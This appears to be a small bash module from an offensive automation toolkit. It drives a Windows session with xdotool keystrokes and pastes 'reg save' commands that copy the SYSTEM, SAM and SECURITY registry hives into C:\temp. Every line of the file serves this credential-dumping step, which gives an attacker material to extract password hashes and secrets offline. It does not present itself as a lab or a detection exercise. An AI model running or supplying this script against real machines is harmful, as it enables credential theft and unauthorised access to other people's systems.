#!/bin/bash

: '
Registry: Save SYSTEM, SECURITY, and SAM hives.
'

paste_command "mkdir C:\temp"
xdotool key Return
sleep 1

paste_command "reg save hklm\system C:\temp\system.save"
xdotool key Return
sleep 3

paste_command "reg save hklm\sam C:\temp\sam.save"
xdotool key Return
sleep 3

paste_command "reg save hklm\security C:\temp\security.save"
xdotool key Return
sleep 3
